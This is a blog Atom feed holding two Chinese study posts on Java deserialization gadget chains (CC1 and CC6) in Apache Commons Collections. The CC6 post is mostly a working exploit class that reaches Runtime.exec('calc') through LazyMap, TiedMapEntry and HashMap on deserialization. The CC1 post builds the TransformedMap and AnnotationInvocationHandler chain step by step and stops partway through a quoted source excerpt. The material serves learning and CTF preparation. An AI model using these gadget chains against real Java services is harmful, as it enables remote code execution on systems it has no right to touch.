<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>向每个梦想加速</title>
  
  <subtitle>Welcome to Thebaobao&#39;s blog ~</subtitle>
  <link href="https://thebaobao.github.io/atom.xml" rel="self"/>
  
  <link href="https://thebaobao.github.io/"/>
  <updated>2025-10-30T11:48:16.439Z</updated>
  <id>https://thebaobao.github.io/</id>
  
  <author>
    <name>向每个梦想加速</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CC6</title>
    <link href="https://thebaobao.github.io/2025/10/30/CC6/"/>
    <id>https://thebaobao.github.io/2025/10/30/CC6/</id>
    <published>2025-10-30T11:43:13.000Z</published>
    <updated>2025-10-30T11:48:16.439Z</updated>
    
    <content type="html"><![CDATA[<p>qweqweqwe</p><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><ul><li>URLDNS链</li><li>CC1</li></ul><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CC1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            );</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    invokerTransformer</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">HashedMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashedMap</span>();</span><br><span class="line">            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c_AnnotationInvocationHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c_AnnotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Retention.class,transformedmap);</span><br><span class="line"></span><br><span class="line">            serialize(o);</span><br><span class="line">            unserialize(<span class="string">&quot;D:\\Download\\CC\\c6\\cc6\\cc1.txt&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    chain:</span></span><br><span class="line"><span class="comment">    HahsMap.readObject()</span></span><br><span class="line"><span class="comment">    HashMap.put()</span></span><br><span class="line"><span class="comment">    HashMap.hash()</span></span><br><span class="line"><span class="comment">        TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">        TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">            LazyMap.get()</span></span><br><span class="line"><span class="comment">                ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                    InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                        Runtime.exec()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cc6_hashcode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            );</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    invokerTransformer</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashedMap</span>(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            tiedMapEntry.hashCode();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;e.printStackTrace();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cc6_put</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            );</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    invokerTransformer</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashedMap</span>(), chainedTransformer);</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            hashMap.put(tiedMapEntry,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            put会提前调用链，导致我们无法通过反序列化的readObject弹calc</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cc6</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            );</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    invokerTransformer</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashedMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">000</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;333&quot;</span>);</span><br><span class="line">            HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            hashMap.put(tiedMapEntry,<span class="string">&quot;222&quot;</span>);</span><br><span class="line">            map.remove(<span class="string">&quot;333&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f.set(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">            serialize(hashMap);</span><br><span class="line">            unserialize(<span class="string">&quot;D:\\Download\\CC\\c6\\cc6\\cc1.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:\\Download\\CC\\c6\\cc6\\cc1.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义反序列化方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.freebuf.com/articles/web/336628.html">https://www.freebuf.com/articles/web/336628.html</a></li><li><a href="https://blog.csdn.net/qq_61237064/article/details/127562419">https://blog.csdn.net/qq_61237064/article/details/127562419</a></li><li><a href="https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/">https://drun1baby.top/2022/06/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8703-CC6%E9%93%BE/</a></li><li><a href="https://www.cnblogs.com/CVE-Lemon/p/17935937.html">https://www.cnblogs.com/CVE-Lemon/p/17935937.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;qweqweqwe&lt;/p&gt;
&lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;URLDNS链&lt;/li&gt;
&lt;li&gt;CC1&lt;/li&gt;
&lt;</summary>
      
    
    
    
    
    <category term="CC6" scheme="https://thebaobao.github.io/tags/CC6/"/>
    
  </entry>
  
  <entry>
    <title>CC1</title>
    <link href="https://thebaobao.github.io/2025/10/27/CC1/"/>
    <id>https://thebaobao.github.io/2025/10/27/CC1/</id>
    <published>2025-10-26T16:12:33.000Z</published>
    <updated>2025-10-27T13:22:45.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>涉及知识：Java反射、Java SE和Java EE</p><p>环境搭建可以看结尾参考的文章。</p><p>这里写篇CC只是为了记录一下Java题目，为后面的Wp做准备，所以除了WP不会写的太详细。</p><h1 id="思路代码更迭"><a href="#思路代码更迭" class="headerlink" title="思路代码更迭"></a>思路代码更迭</h1><p>具体操作步骤不附图了。有点麻烦。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//原生弹calc</span></span><br><span class="line"><span class="comment">//            Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            r.exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//=========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射弹calc</span></span><br><span class="line">              <span class="comment">//part1:这里由于在Runtime类当中，Runtime类的构造器是私有（private）的</span></span><br><span class="line">              <span class="comment">//      所以要使用Runtime类的getRuntime获取实例。</span></span><br><span class="line"><span class="comment">//            Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">//            Object o1 = c1.newInstance();</span></span><br><span class="line"><span class="comment">//            Method m1 = c1.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//            m1.invoke(c1,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//part2: 在某些情况下会被 SecurityManager 拦截抛出 SecurityException异常</span></span><br><span class="line"><span class="comment">//            Constructor&lt;Runtime&gt; ctor = Runtime.class.getDeclaredConstructor();</span></span><br><span class="line"><span class="comment">//            ctor.setAccessible(true); // 绕过 private</span></span><br><span class="line"><span class="comment">//            Runtime runtime = ctor.newInstance();</span></span><br><span class="line"><span class="comment">//            runtime.exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              <span class="comment">//part3:使用getRuntime正确获取实例。原型：Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//            Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">//            Method getRuntimeMethod = c1.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line"><span class="comment">//            Object Runtime = getRuntimeMethod.invoke(c1);</span></span><br><span class="line"><span class="comment">//            Method m = c1.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//            m.invoke(Runtime,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            在org.apache.commons.collections.Transformer;的Transformer当中有transform方法。</span></span><br><span class="line"><span class="comment">            ctrl+b查找那个类重写了transforme，发现InvokerTransformer类重写了。</span></span><br><span class="line"><span class="comment">            为什么要找这个类？因为这里使用反射执行了任意方法调用，类似后门。</span></span><br><span class="line"><span class="comment">            关键代码如下：</span></span><br><span class="line"><span class="comment">                Class cls = input.getClass();</span></span><br><span class="line"><span class="comment">                Method method = cls.getMethod(iMethodName, iParamTypes);</span></span><br><span class="line"><span class="comment">                return method.invoke(input, iArgs);</span></span><br><span class="line"><span class="comment">             向上查找发现有三个参数可控：</span></span><br><span class="line"><span class="comment">                public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span></span><br><span class="line"><span class="comment">                    super();</span></span><br><span class="line"><span class="comment">                    iMethodName = methodName;</span></span><br><span class="line"><span class="comment">                    iParamTypes = paramTypes;</span></span><br><span class="line"><span class="comment">                    iArgs = args;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="comment">//使用InvokerTransformer内的invoke弹calc。接下来ALT+F7查找谁有哪些同名transform方法</span></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//            invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            查找到TransformedMap类下的checkSetValue方法当中调用了transform（优先查找在readObject方法下的）</span></span><br><span class="line"><span class="comment">            为什么查找transform？因为我们构造的链子是类似于重写，通过方法的重写得到最终的readObject</span></span><br><span class="line"><span class="comment">            关键代码：</span></span><br><span class="line"><span class="comment">                protected Object checkSetValue(Object value) &#123;</span></span><br><span class="line"><span class="comment">                    return valueTransformer.transform(value);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            1.我们既然要让他类似重写，那么我们将valueTransformer改为invockerTransformer。</span></span><br><span class="line"><span class="comment">            2.我们要调用checkSetValue并传参数Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">            先解决1，我们找valueTransformer的设置器</span></span><br><span class="line"><span class="comment">                protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span></span><br><span class="line"><span class="comment">                    super(map);</span></span><br><span class="line"><span class="comment">                    this.keyTransformer = keyTransformer;</span></span><br><span class="line"><span class="comment">                    this.valueTransformer = valueTransformer;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            我们可以调用TransformedMap对valueTransformer赋值，</span></span><br><span class="line"><span class="comment">            但是这个TransformedMap方法被protected修饰，那么他会被这个TransformedMap类内实例化，向上找TransformedMap</span></span><br><span class="line"><span class="comment">                public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span></span><br><span class="line"><span class="comment">                    return new TransformedMap(map, keyTransformer, valueTransformer);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            我们可以调用被public修饰的decorate方法给valueTransformer赋值，这会返回实例化一个TransformedMap方法，并且在之后会进行赋值。</span></span><br><span class="line"><span class="comment">            1.解决了，现在解决2.</span></span><br><span class="line"><span class="comment">            ALT+F7查找checkSetValue被谁调用，发现在AbstractInputCheckedMapDecorator方法当中的setValue方法内调用（这里是TransformedMap类extends了AbstractInputCheckedMapDecorator类，所以会调用这个类的setValue方法内的checkSetValue）</span></span><br><span class="line"><span class="comment">            这个setValue是被public修饰可以直接调用，那么怎样调用这个setvalue呢？</span></span><br><span class="line"><span class="comment">            MapEntry方法extends了AbstractMapEntryDecorator类，而AbstractMapEntryDecorator类implements了Map.Entry，所以，我们在进行Map遍历的时候就可以调用setValue并将参数传进去。</span></span><br><span class="line"><span class="comment">            由于最终AbstractMapEntryDecorator类当中setValue被调用时的参数类型是Object，所以我们Map也必须是Object类型</span></span><br><span class="line"><span class="comment">                public Object setValue(Object object) &#123;</span></span><br><span class="line"><span class="comment">                    return entry.setValue(object);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//            InvokerTransformer invokerTransformer = new InvokerTransformer(</span></span><br><span class="line"><span class="comment">//                    &quot;exec&quot;,</span></span><br><span class="line"><span class="comment">//                    new Class[]&#123;String.class&#125;,</span></span><br><span class="line"><span class="comment">//                    new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">////            invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//            Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//            HashedMap map = new HashedMap();</span></span><br><span class="line"><span class="comment">//            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);</span></span><br><span class="line"><span class="comment">//            map.put(&quot;a&quot;,&quot;b&quot;);</span></span><br><span class="line"><span class="comment">//            for (Map.Entry&lt;Object,Object&gt; entry : transformedmap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//                entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//==========================================================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            ALT+F7查找哪些类内的方法与setValue重名（还是优先找readObject方法下）</span></span><br><span class="line"><span class="comment">            AnnotationInvocationHandler类下正好有readObject方法并调用了setValue，那么这里就是链子最终的地方。</span></span><br><span class="line"><span class="comment">            先弄序列化和反序列化方法进去。</span></span><br><span class="line"><span class="comment">            关键代码如下：</span></span><br><span class="line"><span class="comment">    private void readObject(java.io.ObjectInputStream s)</span></span><br><span class="line"><span class="comment">        throws java.io.IOException, ClassNotFoundException &#123;</span></span><br><span class="line"><span class="comment">        s.defaultReadObject();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        // Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        AnnotationType annotationType = null;</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="comment">        &#125; catch(IllegalArgumentException e) &#123;</span></span><br><span class="line"><span class="comment">            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="comment">            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        // If there are annotation members without values, that</span></span><br><span class="line"><span class="comment">        // situation is handled by the invoke method.</span></span><br><span class="line"><span class="comment">        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">            String name = memberValue.getKey();</span></span><br><span class="line"><span class="comment">            Class&lt;?&gt; memberType = memberTypes.get(name);</span></span><br><span class="line"><span class="comment">            if (memberType != null) &#123;  // i.e. member still exists</span></span><br><span class="line"><span class="comment">                Object value = 